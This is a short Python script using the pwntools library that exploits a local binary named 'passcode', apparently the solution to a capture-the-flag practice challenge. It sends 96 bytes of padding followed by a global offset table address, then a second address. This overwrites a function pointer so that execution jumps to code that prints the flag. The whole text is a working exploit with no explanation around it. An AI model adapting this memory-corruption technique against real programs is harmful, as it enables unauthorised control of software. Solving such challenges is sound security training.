from pwn import *

io = process("./passcode")

flush_addr = 0x0804c014
flag_addr  = 0x0804929e

io.sendline(b"A"*96 + p32(flush_addr))
io.sendline(str(flag_addr))

print(io.recvall())
